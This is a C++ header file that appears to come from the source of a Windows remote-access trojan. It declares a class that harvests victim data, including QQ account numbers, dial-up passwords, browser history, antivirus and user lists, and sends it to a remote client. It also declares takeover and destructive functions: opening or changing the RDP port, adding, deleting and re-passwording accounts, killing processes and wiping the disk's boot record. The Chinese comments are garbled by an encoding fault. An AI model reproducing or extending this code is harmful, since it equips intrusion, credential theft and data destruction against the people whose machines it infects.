// SystemManager.h: interface for the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
#define AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

//��Ϣ�б�ṹ��
struct tagSystemInfo
{
	char szCpuInfo[50];   //CPU��Ϣ
	char szActiveTime[100]; //�ʱ��
	char szAntiVirus[50]; //ɱ�����
	char szUserName[50];   //��ǰ�û���
	char szPcName[50];  //�������
	char szRemotePort[10]; //Զ�̶˿�
	DWORD szMemory;         //�ڴ��С 
	DWORD szMemoryFree;     //�����ڴ� 
	DWORD szDriveSize;      //Ӳ�̴�С
	DWORD szDriveFreeSize;  //����Ӳ�̴�С
	char szOpenInfo[50];	// �Ƿ�˫��(�Ƿ���)
	char szDLLPath[MAX_PATH];    // �����·��
	char szScrxy[20];			//��Ļ�ֱ���
	char szQQNum[100];		//��ǰQQ
	char szQQNums[1024];	//��ʷQQ
	int port;				//�˿�
	char szAddress[50];		//���ߵ�ַ
	char szTime[128];		//����ʱ��
	bool bIsActive;			//�û�״̬
	char szLanguage[50];	//ϵͳ����
};

struct tagSysstatus
{
	int		Mem;
	int		cpu;
	DWORD	Bandout;
	DWORD	Bandout_B;
	int		dwTime;
	bool	bIsActive;

};

class CSystemManager : public CManager  
{
public:
	CSystemManager(CClientSocket *pClient,LPCSTR lpszHost, UINT nPort);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	static BOOL DebugPrivilege(const char *PName,BOOL bEnable);
	static void ShutdownWindows(DWORD dwReason);
	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
private:
	LPBYTE getProcessList();
	LPBYTE getWindowsList();
	LPBYTE getSoftWareList();

	void SendProcessList();
	void SendWindowsList();
	void SendDialupassList();
	void SendSoftWareList();

	void KillProcess(LPBYTE lpBuffer, UINT nSize);
	void TestWindow(LPBYTE lpBuffer);
	void CloseWindow(LPBYTE lpBuffer);

	
	void SendSysInfoList();
	void GetSystemInfo(tagSystemInfo* pSysInfo);
	
	void SendSysUserList();
	LPBYTE getSysUserList();
	
	void SendUserStateList();
	LPBYTE getUserStateList();

	LPBYTE getNetWorkList();
	void SendNetWorkList();

	LPBYTE getRunList();
	void SendRunList();

	void SendHostsList();

	void SendFileAttr(LPCSTR lpBuffer); //�ļ�����

	void ProcessFreezing(LPBYTE lpBuffer, UINT nSize); //���̶���
	void ProcessThawing(LPBYTE lpBuffer, UINT nSize);//���̽ⶳ

	void CSystemManager::SendIEHistoryList(); // ����IE��ʷ��¼
	LPBYTE CSystemManager::getIEHistoryList(); // ȡIE��ʷ��¼

	void CSystemManager::SendFavoritesUrlList();// �����ղؼ�
	LPBYTE CSystemManager::getFavoritesUrlList();//

	void CSystemManager::SendNetStateList();// ������������

	void CSystemManager::KillMBR(); // Ӳ�̻���
	
//	bool CSystemManager::GetBandOut(DWORD &dwBandoutBytes,DWORD &dwBandInputBytes); //�����д���


	void ChangeUserState(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //�ʻ����� ֹͣ
	void ChangeUserPass(LPBYTE lpBuffer, UINT nSize);
	void DeleteUser(LPBYTE lpBuffer, UINT nSize);
	void DisconnectUser(LPBYTE lpBuffer, UINT nSize);
	void LogOffUser(LPBYTE lpBuffer, UINT nSize);
	void NoNetAddUser(LPBYTE lpBuffer, UINT nSize);
	BOOL Change3389Port(LPVOID lparam);
	void Open3389();
	void GetTermsrvFile();
	BOOL WriteTermsrv(LPBYTE lpBuffer, UINT nSize);

	HANDLE hSendMemoryThread;
	static DWORD WINAPI SendCPUAndMemoryThread(LPVOID lparam);

	UINT    NetPort;    //���Ӷ˿�
//     UCHAR   NetLine;    //���ӷ�ʽ
//     UCHAR   NetOpert;   //��������
    LPCSTR Linkaddress;  //���ӵ�ַ
	


};

#endif // !defined(AFX_SYSTEMMANAGER_H__5E44B060_837A_4D2D_9E75_E4A33E51CAE1__INCLUDED_)
